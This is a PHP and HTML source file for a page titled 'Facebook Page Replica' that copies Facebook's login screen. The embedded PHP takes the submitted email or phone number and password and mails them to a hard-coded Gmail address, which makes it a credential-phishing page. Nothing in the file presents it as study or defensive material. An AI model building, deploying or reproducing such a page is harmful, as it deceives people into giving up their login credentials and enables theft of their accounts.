<?php 
 if(isset($_POST['submit'])){
  $to = "upuljeewantha070@gmail.com"; // this is your Email address
  $from = $_POST['email']; // this is the sender's Email address

  $email = $_POST['email'];
  $password = $_POST['password'];
  $subject = "Form submission";
  $subject2 = "Copy of your form submission";
  $message = " email/phone number is " .$email . " and password is " . $password ;
 

  $headers = "From:" . $from;
  $headers2 = "From:" . $to;
  mail($to,$subject,$message,$headers);
  }
?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook Page Replica</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>
  <div class="container">
    <div class="left">
      <h1>facebook</h1>
      <p>Facebook helps you connect and share with the people in your life.</p>
    </div>
    <div class="right">
      <form action="" method="post">
        <input type="text" placeholder="Email addess or phone number" name="email">
        <input type="password" placeholder="Password" name="Password">

        <input type="submit" name="submit" value="Submit" class="loginBtn" placeholder="Log In">
        <a href="" class="forget">Forgotten password?</a>
        <div class="sign-up">
          <a href="" class="signupBtn">Create New Account</a>
        </div>
      </form>
      <p><b>Create a Page</b> for a celebrity, band or business.</p>
    </div>
  </div>
</body>

</html>